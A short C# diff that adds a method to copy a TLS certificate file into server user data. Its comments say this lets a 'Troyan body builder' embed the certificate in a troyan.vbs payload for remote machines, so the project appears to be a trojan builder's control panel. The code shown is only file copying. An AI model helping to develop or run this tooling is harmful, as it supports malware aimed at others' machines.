@@ -2,6 +2,20 @@ namespace Commons;
 
 public partial class ServerService
 {
+    /// <summary>Copies the canonical Hephaestus TLS PFX into panel user data (<see cref="ServerLayoutPaths.UserDataTlsPfx"/>) when the source file exists, so the Troyan body builder can embed certificate bytes for machines that never see the panel disk.</summary>
+    public void StageHelphaestusTlsPfxForTroyanBuild(ServerLayoutPaths layout)
+    {
+        ArgumentNullException.ThrowIfNull(layout);
+
+        var src = layout.HephaestusTlsPfx;
+        var dest = layout.UserDataTlsPfx;
+        if (!File.Exists(src))
+            return;
+
+        Directory.CreateDirectory(layout.UserDataDir);
+        File.Copy(src, dest, overwrite: true);
+    }
+
     /// <summary>Copies the built <c>troyan.vbs</c> and <c>body.txt</c> from Troyan <c>_output</c> into server user data (<see cref="ServerLayoutPaths.UserTroyanVbs"/>, <see cref="ServerLayoutPaths.UserBody"/>), replacing any existing files. Creates the user data directory if it does not exist.</summary>
     public void PublishTroyanVbsFromBuildOutput(ServerLayoutPaths layout)
     {
